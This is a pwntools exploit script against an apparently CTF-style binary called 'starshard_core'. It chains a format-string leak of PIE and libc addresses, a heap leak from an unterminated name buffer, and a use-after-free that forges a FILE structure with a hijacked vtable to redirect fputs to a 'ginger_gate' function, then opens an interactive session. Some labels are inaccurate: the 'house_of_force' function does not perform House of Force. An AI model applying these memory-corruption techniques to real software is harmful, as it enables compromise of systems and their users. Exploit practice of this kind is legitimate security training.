from pwn import *

context.binary = elf = ELF("./starshard_core", checksec=False)
libc = ELF("glibc/libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
core_log_cached = 0


def start():
	if args.REMOTE:
		return remote(args.HOST, int(args.PORT))
	return process([elf.path], env={"LD_PRELOAD": libc.path})


def leak_bases(io):
	"""Use the tiny format-string in the tinkerer name to leak PIE + libc."""
	io.sendlineafter(b"Name: ", b"%11$p.%9$p")
	io.recvuntil(b"Welcome ")
	pie_leak, libc_leak = io.recvline(False).split(b"." , 1)
	pie_base = int(pie_leak, 16) - elf.sym.main
	libc_base = int(libc_leak.split()[0], 16) - libc.sym.__libc_start_main + 128
	log.success(f"PIE  base @ {pie_base:#x}")
	log.success(f"libc base @ {libc_base:#x}")
	return pie_base, libc_base


def leak_heap(io):
	"""
	Abuse the missing NUL-termination in spell_name: print 24 bytes so the
	following FILE* (core_log) bytes bleed into stdout. This gives us the heap
	pointer of the FILE struct (tcache bin chunk), enough to derive the top chunk.
	"""

	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"Routine Name: ", b"A" * 24)
	line = io.recvline(False)
	tail = line.split(b"\xe2\x80\x94 AAAAAAAAAAAAAAAAAAAAAAAA", 1)[1]
	leak_bytes = tail.rstrip(b"\n")
	# pad to 8 then little-endian decode
	leak_bytes = leak_bytes.ljust(8, b"\x00")
	core_log_ptr = u64(leak_bytes)
	heap_base = core_log_ptr & ~0xfff
	log.success(f"core_log @ {core_log_ptr:#x}")
	log.success(f"heap page @ {heap_base:#x}")
	return core_log_ptr, heap_base


def house_of_force(io, pie, libc_base, heap_base):
	"""Exploit via FILE UAF chunk reuse; trigger fputs -> ginger_gate."""

	# 1) cancel_routine to free FILE chunk
	io.sendlineafter(b"> ", b"3")

	# 2) allocate fragment of same size (0x1d0 -> size 0x1e0)
	io.sendlineafter(b"> ", b"2")
	io.sendlineafter(b"Size: ", b"464")

	core_log_addr = core_log_cached
	vtable_addr = core_log_addr + 0xe0
	ginger = pie + elf.sym.ginger_gate

	buf = bytearray(0xd8)
	buf[0:8] = p64(0xfbad1800)           # _flags similar to stdout
	buf[0x8:0x10] = p64(0)               # _IO_read_ptr
	buf[0x10:0x18] = p64(0)              # _IO_read_end
	buf[0x18:0x20] = p64(0)              # _IO_read_base
	buf[0x20:0x28] = p64(core_log_addr)  # _IO_write_base
	buf[0x28:0x30] = p64(core_log_addr+0x20)  # _IO_write_ptr > end
	buf[0x30:0x38] = p64(core_log_addr)  # _IO_write_end smaller
	buf[0x38:0x40] = p64(core_log_addr)  # _IO_buf_base
	buf[0x40:0x48] = p64(core_log_addr+0x80)  # _IO_buf_end
	buf[0x48:0x50] = p64(0)              # _IO_save_base
	buf[0x50:0x58] = p64(0)              # _IO_backup_base
	buf[0x58:0x60] = p64(0)              # _IO_save_end
	buf[0x60:0x68] = p64(0)              # markers
	buf[0x68:0x70] = p64(core_log_addr)  # _lock
	buf[0x70:0x78] = p64(0)              # _offset
	buf[0x78:0x80] = p64(0)              # _codecvt
	buf[0x80:0x88] = p64(0)              # _wide_data->fake? set 0
	buf[0x88:0x90] = p64(0)              # _freeres_list
	buf[0x90:0x98] = p64(0)              # _freeres_buf
	buf[0x98:0xa0] = p64(0)              # __pad5
	buf[0xa0:0xa4] = (0).to_bytes(4,'little')  # _mode
	buf[0xa8:0xb8] = b"\x00"*0x10        # padding
	buf[0xb8:0xc8] = p64(0)*2            # more padding
	buf[0xc8:0xd0] = p64(0)              # __pad7
	buf[0xd0:0xd8] = p64(0)

	buf += p64(vtable_addr)
	buf += p64(ginger) * 20
	payload = bytes(buf).ljust(0x1d0, b"\x00")

	io.sendafter(b"Fragment:\n", payload + b"\n")

	log.info(f"Ready to commit; PID={io.proc.pid} pie={pie:#x} libc={libc_base:#x} core_log={core_log_addr:#x}")
	log.info("Sleeping 20s for gdb attach...")
	time.sleep(20)

	# 3) commit triggers fputs
	io.sendlineafter(b"> ", b"4")
	io.interactive()


def main():
	global core_log_cached
	io = start()
	pie, libc_base = leak_bases(io)
	core_log_cached, heap_base = leak_heap(io)
	house_of_force(io, pie, libc_base, heap_base)


if __name__ == "__main__":
	main()
